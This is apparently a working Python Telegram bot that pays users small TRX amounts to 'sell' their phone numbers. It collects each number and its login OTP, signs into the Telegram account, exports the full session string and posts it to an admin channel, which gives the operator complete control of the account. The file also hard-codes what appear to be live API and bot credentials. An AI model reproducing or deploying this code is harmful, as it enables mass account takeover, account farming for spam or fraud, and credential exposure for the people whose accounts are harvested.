from pyrogram import Client, filters from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton import os import json import datetime

✅ Bot credentials

api_id = 23347107 api_hash = "8193110bf32a08f41ac6e9050b2a4df4" bot_token = "7620884098:AAF8ObWhRQxsB0IXuFa_0bTWh5QQeE9dKmo" admin_id = 7051377916 withdraw_channel = -1002437499884 session_channel = -1002784748324

✅ Create or load used numbers JSON file

USED_NUMBERS_FILE = "used_numbers.json" USER_DATA_FILE = "user_data.json" if not os.path.exists(USED_NUMBERS_FILE): with open(USED_NUMBERS_FILE, "w") as f: json.dump([], f) if not os.path.exists(USER_DATA_FILE): with open(USER_DATA_FILE, "w") as f: json.dump({}, f)

✅ Load & Save Helpers

def load_used_numbers(): with open(USED_NUMBERS_FILE, "r") as f: return json.load(f)

def save_used_number(phone): numbers = load_used_numbers() numbers.append(phone) with open(USED_NUMBERS_FILE, "w") as f: json.dump(numbers, f)

def load_user_data(): with open(USER_DATA_FILE, "r") as f: return json.load(f)

def save_user_data(data): with open(USER_DATA_FILE, "w") as f: json.dump(data, f)

def update_balance(user_id, amount): data = load_user_data() user_id = str(user_id) if user_id not in data: data[user_id] = {"balance": 0.0, "wallet": "", "added": 0} data[user_id]["balance"] += amount data[user_id]["added"] += 1 save_user_data(data)

def get_user_balance(user_id): data = load_user_data() return data.get(str(user_id), {}).get("balance", 0.0)

def set_wallet(user_id, address): data = load_user_data() user_id = str(user_id) if user_id not in data: data[user_id] = {"balance": 0.0, "wallet": "", "added": 0} data[user_id]["wallet"] = address save_user_data(data)

def get_wallet(user_id): data = load_user_data() return data.get(str(user_id), {}).get("wallet", "Not set")

def get_added_count(user_id): data = load_user_data() return data.get(str(user_id), {}).get("added", 0)

rate = 0.10 bot = Client("bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token) sessions = {}

@bot.on_message(filters.command("start")) async def start(_, m: Message): keyboard = InlineKeyboardMarkup([ [InlineKeyboardButton("Sell Number", callback_data="sell")], [InlineKeyboardButton("My Account", callback_data="account"), InlineKeyboardButton("Add Wallet", callback_data="wallet")], [InlineKeyboardButton("Withdraw", callback_data="withdraw")], [InlineKeyboardButton("Support Group", url="https://t.me/yourgroup")] ]) await m.reply("Welcome to the Bot!", reply_markup=keyboard)

@bot.on_callback_query() async def callback_handler(_, q): data = q.data user_id = q.from_user.id

if data == "sell":
    await q.message.reply("📱 Send your phone number:")
    sessions[user_id] = {"step": "wait_phone"}

elif data == "account":
    bal = get_user_balance(user_id)
    count = get_added_count(user_id)
    await q.message.reply(f"💰 Balance: ${bal:.2f}\n📦 Total Added: {count}")

elif data == "wallet":
    await q.message.reply("🔗 Send your TRX wallet address:")
    sessions[user_id] = {"step": "wait_wallet"}

elif data == "withdraw":
    bal = get_user_balance(user_id)
    if bal >= 2:
        wallet = get_wallet(user_id)
        count = get_added_count(user_id)
        await bot.send_message(withdraw_channel, f"💸 Withdraw Request\n👤 User: {q.from_user.mention} ({user_id})\n💰 Amount: ${bal:.2f}\n🔗 Wallet: {wallet}\n📦 Added: {count}")
        update_balance(user_id, -bal)
        await q.message.reply("✅ Withdraw request sent.")
    else:
        await q.message.reply("❌ Minimum withdraw is $2.00")

@bot.on_message(filters.text) async def handle_text(_, m: Message): user = sessions.get(m.from_user.id) if not user: return

step = user.get("step")
if step == "wait_wallet":
    set_wallet(m.from_user.id, m.text.strip())
    await m.reply("✅ Wallet set successfully.")
    sessions.pop(m.from_user.id, None)

elif step == "wait_phone":
    phone = m.text.strip()
    if phone in load_used_numbers():
        await m.reply("⚠️ This number is already used to create a session.")
        sessions.pop(m.from_user.id, None)
        return

    user["phone"] = phone
    user["step"] = "wait_code"
    user["client"] = Client(f"session_{m.from_user.id}", api_id=api_id, api_hash=api_hash, phone_number=phone, in_memory=True)
    await user["client"].connect()
    try:
        sent = await user["client"].send_code(phone)
        user["code_hash"] = sent.phone_code_hash
        await m.reply("📨 OTP sent! Now send the code:")
    except Exception as e:
        await m.reply(f"❌ Failed to send OTP: {e}")
        await user["client"].disconnect()
        sessions.pop(m.from_user.id, None)

elif step == "wait_code":
    code = m.text.strip()
    try:
        await user["client"].sign_in(user["phone"], user["code_hash"], code)
        string_session = await user["client"].export_session_string()
        save_used_number(user["phone"])
        update_balance(m.from_user.id, rate)
        count = get_added_count(m.from_user.id)
        await bot.send_message(session_channel, f"✅ New Session\n👤 User: {m.from_user.mention}\n📱 Number: {user['phone']}\n📦 Total: {count}\n

<code>{string_session}</code>") await m.reply(f"✅ Session created and $ {rate:.2f} added to your account.") except Exception as e: await m.reply(f"❌ Login failed: {e}") finally: await user["client"].disconnect() sessions.pop(m.from_user.id, None)

bot.run()

